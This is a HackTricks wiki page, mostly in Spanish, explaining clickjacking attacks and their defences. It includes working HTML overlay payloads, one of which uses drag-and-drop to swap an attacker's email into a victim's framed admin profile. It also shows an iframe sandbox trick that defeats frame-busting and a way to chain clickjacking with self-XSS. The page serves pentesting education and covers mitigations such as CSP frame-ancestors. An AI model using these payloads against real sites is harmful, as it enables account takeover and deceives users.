# Clickjacking

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 游눫 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm_source=hacktricks\&utm_medium=text\&utm_campaign=ppc\&utm_term=trickest\&utm_content=clickjacking) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=clickjacking" %}

## What is Clickjacking

En un ataque de clickjacking, un **usuario** es **enga침ado** para **hacer clic** en un **elemento** en una p치gina web que es **invisible** o disfrazado como otro elemento. Esta manipulaci칩n puede llevar a consecuencias no deseadas para el usuario, como la descarga de malware, redirecci칩n a p치ginas web maliciosas, provisi칩n de credenciales o informaci칩n sensible, transferencias de dinero, o la compra en l칤nea de productos.

### Prepopulate forms trick

A veces es posible **llenar el valor de los campos de un formulario usando par치metros GET al cargar una p치gina**. Un atacante puede abusar de este comportamiento para llenar un formulario con datos arbitrarios y enviar la carga 칰til de clickjacking para que el usuario presione el bot칩n Enviar.

### Populate form with Drag\&Drop

Si necesitas que el usuario **llene un formulario** pero no quieres pedirle directamente que escriba informaci칩n espec칤fica (como el correo electr칩nico o una contrase침a espec칤fica que conoces), puedes simplemente pedirle que **Drag\&Drop** algo que escriba tus datos controlados como en [**este ejemplo**](https://lutfumertceylan.com.tr/posts/clickjacking-acc-takeover-drag-drop/).

### Basic Payload
```markup
<style>
iframe {
position:relative;
width: 500px;
height: 700px;
opacity: 0.1;
z-index: 2;
}
div {
position:absolute;
top:470px;
left:60px;
z-index: 1;
}
</style>
<div>Click me</div>
<iframe src="https://vulnerable.com/email?email=asd@asd.asd"></iframe>
```
### Carga 칰til de m칰ltiples pasos
```markup
<style>
iframe {
position:relative;
width: 500px;
height: 500px;
opacity: 0.1;
z-index: 2;
}
.firstClick, .secondClick {
position:absolute;
top:330px;
left:60px;
z-index: 1;
}
.secondClick {
left:210px;
}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://vulnerable.net/account"></iframe>
```
### Drag\&Drop + Click payload
```markup
<html>
<head>
<style>
#payload{
position: absolute;
top: 20px;
}
iframe{
width: 1000px;
height: 675px;
border: none;
}
.xss{
position: fixed;
background: #F00;
}
</style>
</head>
<body>
<div style="height: 26px;width: 250px;left: 41.5%;top: 340px;" class="xss">.</div>
<div style="height: 26px;width: 50px;left: 32%;top: 327px;background: #F8F;" class="xss">1. Click and press delete button</div>
<div style="height: 30px;width: 50px;left: 60%;bottom: 40px;background: #F5F;" class="xss">3.Click me</div>
<iframe sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-scripts" style="opacity:0.3"src="https://target.com/panel/administration/profile/"></iframe>
<div id="payload" draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'attacker@gmail.com')"><h3>2.DRAG ME TO THE RED BOX</h3></div>
</body>
</html>
```
### XSS + Clickjacking

Si has identificado un **ataque XSS que requiere que un usuario haga clic** en alg칰n elemento para **activar** el XSS y la p치gina es **vulnerable a clickjacking**, podr칤as abusar de ello para enga침ar al usuario para que haga clic en el bot칩n/enlace.\
Ejemplo:\
&#xNAN;_&#x59;ou encontraste un **self XSS** en algunos detalles privados de la cuenta (detalles que **solo t칰 puedes establecer y leer**). La p치gina con el **formulario** para establecer estos detalles es **vulnerable** a **Clickjacking** y puedes **prellenar** el **formulario** con los par치metros GET._\
\_\_Un atacante podr칤a preparar un **ataque de Clickjacking** a esa p치gina **prellenando** el **formulario** con la **carga 칰til de XSS** y **enga침ando** al **usuario** para que **env칤e** el formulario. As칤, **cuando se env칤e el formulario** y los valores sean modificados, el **usuario ejecutar치 el XSS**.

## Estrategias para Mitigar Clickjacking

### Defensas del Lado del Cliente

Los scripts ejecutados en el lado del cliente pueden realizar acciones para prevenir el Clickjacking:

* Asegurarse de que la ventana de la aplicaci칩n sea la ventana principal o superior.
* Hacer que todos los marcos sean visibles.
* Prevenir clics en marcos invisibles.
* Detectar y alertar a los usuarios sobre posibles intentos de Clickjacking.

Sin embargo, estos scripts de ruptura de marcos pueden ser eludidos:

* **Configuraciones de Seguridad de los Navegadores:** Algunos navegadores podr칤an bloquear estos scripts bas치ndose en sus configuraciones de seguridad o falta de soporte para JavaScript.
* **Atributo `sandbox` de HTML5 iframe:** Un atacante puede neutralizar los scripts de ruptura de marcos estableciendo el atributo `sandbox` con valores `allow-forms` o `allow-scripts` sin `allow-top-navigation`. Esto impide que el iframe verifique si es la ventana superior, e.g.,
```html
<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms allow-scripts"></iframe>
```
Los valores `allow-forms` y `allow-scripts` habilitan acciones dentro del iframe mientras deshabilitan la navegaci칩n de nivel superior. Para asegurar la funcionalidad deseada del sitio objetivo, pueden ser necesarios permisos adicionales como `allow-same-origin` y `allow-modals`, dependiendo del tipo de ataque. Los mensajes de la consola del navegador pueden guiar sobre qu칠 permisos permitir.

### Defensas del lado del servidor

#### X-Frame-Options

El **encabezado de respuesta HTTP `X-Frame-Options`** informa a los navegadores sobre la legitimidad de renderizar una p치gina en un `<frame>` o `<iframe>`, ayudando a prevenir Clickjacking:

* `X-Frame-Options: deny` - Ning칰n dominio puede enmarcar el contenido.
* `X-Frame-Options: sameorigin` - Solo el sitio actual puede enmarcar el contenido.
* `X-Frame-Options: allow-from https://trusted.com` - Solo el 'uri' especificado puede enmarcar la p치gina.
* Tenga en cuenta las limitaciones: si el navegador no admite esta directiva, puede que no funcione. Algunos navegadores prefieren la directiva CSP frame-ancestors.

#### Directiva frame-ancestors de Content Security Policy (CSP)

La **directiva `frame-ancestors` en CSP** es el m칠todo recomendado para la protecci칩n contra Clickjacking:

* `frame-ancestors 'none'` - Similar a `X-Frame-Options: deny`.
* `frame-ancestors 'self'` - Similar a `X-Frame-Options: sameorigin`.
* `frame-ancestors trusted.com` - Similar a `X-Frame-Options: allow-from`.

Por ejemplo, el siguiente CSP solo permite el enmarcado desde el mismo dominio:

`Content-Security-Policy: frame-ancestors 'self';`

M치s detalles y ejemplos complejos se pueden encontrar en la [documentaci칩n de frame-ancestors CSP](https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors) y en la [documentaci칩n de frame-ancestors de Mozilla](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors).

### Content Security Policy (CSP) con `child-src` y `frame-src`

La **Content Security Policy (CSP)** es una medida de seguridad que ayuda a prevenir Clickjacking y otros ataques de inyecci칩n de c칩digo al especificar qu칠 fuentes el navegador debe permitir para cargar contenido.

#### Directiva `frame-src`

* Define fuentes v치lidas para frames.
* M치s espec칤fica que la directiva `default-src`.
```
Content-Security-Policy: frame-src 'self' https://trusted-website.com;
```
Esta pol칤tica permite marcos del mismo origen (self) y https://trusted-website.com.

#### Directiva `child-src`

* Introducida en CSP nivel 2 para establecer fuentes v치lidas para trabajadores web y marcos.
* Act칰a como un respaldo para frame-src y worker-src.
```
Content-Security-Policy: child-src 'self' https://trusted-website.com;
```
Esta pol칤tica permite marcos y trabajadores del mismo origen (self) y https://trusted-website.com.

**Notas de Uso:**

* Deprecaci칩n: child-src est치 siendo eliminado a favor de frame-src y worker-src.
* Comportamiento de Respaldo: Si frame-src est치 ausente, se utiliza child-src como respaldo para marcos. Si ambos est치n ausentes, se utiliza default-src.
* Definici칩n Estricta de Fuentes: Incluya solo fuentes confiables en las directivas para prevenir la explotaci칩n.

#### Scripts de JavaScript para Romper Marcos

Aunque no son completamente infalibles, los scripts de ruptura de marcos basados en JavaScript se pueden utilizar para evitar que una p치gina web sea enmarcada. Ejemplo:
```javascript
if (top !== self) {
top.location = self.location;
}
```
#### Empleando Tokens Anti-CSRF

* **Validaci칩n de Tokens:** Utiliza tokens anti-CSRF en aplicaciones web para asegurar que las solicitudes que cambian el estado sean realizadas intencionalmente por el usuario y no a trav칠s de una p치gina Clickjacked.

## Referencias

* [**https://portswigger.net/web-security/clickjacking**](https://portswigger.net/web-security/clickjacking)
* [**https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking\_Defense\_Cheat\_Sheet.html**](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html)

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Utiliza [**Trickest**](https://trickest.com/?utm_source=hacktricks\&utm_medium=text\&utm_campaign=ppc\&utm_term=trickest\&utm_content=clickjacking) para construir y **automatizar flujos de trabajo** f치cilmente, impulsados por las **herramientas comunitarias m치s avanzadas** del mundo.\
Accede hoy:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=clickjacking" %}

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripci칩n**](https://github.com/sponsors/carlospolop)!
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤guenos** en **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>
{% endhint %}
